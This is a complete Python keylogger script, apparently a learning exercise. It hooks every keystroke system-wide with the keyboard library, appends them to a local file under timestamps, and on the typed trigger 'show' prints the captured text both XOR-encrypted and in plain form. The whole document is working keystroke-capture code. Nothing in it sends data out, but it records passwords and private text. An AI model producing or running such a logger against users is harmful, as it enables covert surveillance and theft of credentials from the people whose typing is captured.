import keyboard                      #Import a library that records keyboard keystrokes.
from datetime import datetime            #Import a library that records date and time.
from Xor_2 import xor_on_key


dicti = {}                                          #A dictionary for saving input from the keyboard.
str_for_show = ''
filename = r"C:\my_python\+\file_for_kelogger.txt"


def on_key_press(key):
    
    """ A function that receives input from another function (which records the keyboard),
    and inserts it into a dictionary entry whose key is the current date and time.
    """
    global str_for_show,dicti,filename

    key = key.name
    current_time = datetime.now().strftime('%d/%m/%y %H:%M')
    with open(filename, "a") as our_file:
        if current_time not in dicti:
            dicti[current_time] = ''
            our_file.write(f"**** {current_time} ****\n")

        our_file.write(key)
    dicti[current_time] += key
    str_for_show += key
    
    if "show" in str_for_show.lower():
        for k,v in dicti.items():                     #A loop that checks if the sequence of words "show" exists.

            print("\n****",k,"****")             #If this sequence exists, then the software will print everything that has been saved so far, and empty the dictionary.
            if "show" in v.lower():
                v = v[:-4]
            if "space" in v:
                v = v.replace("space", " ")
            if "enter" in v:                               #Conditions for special characters.
                v = v.replace("enter", "\n")
            if "tab" in v:
                v = v.replace("tab", "\t")
            if "decimal" in v:
                v = v.replace("decimal", ".")


            xor_retutn = xor_on_key(v, 7)         #Sending the value to the xor cipher.
            print("encrypted:",xor_retutn, end="\n")     #Print the encrypted value.
            print("decoded:",v,end = "\n")                   #Print the decoded value.

           
        dicti = {}
        str_for_show = ''

#For checking the current file.
if __name__ == "__main__":
    my_file = open(filename, "w")
    my_file.write("")
    keyboard.on_press(on_key_press)               #function call.
    keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.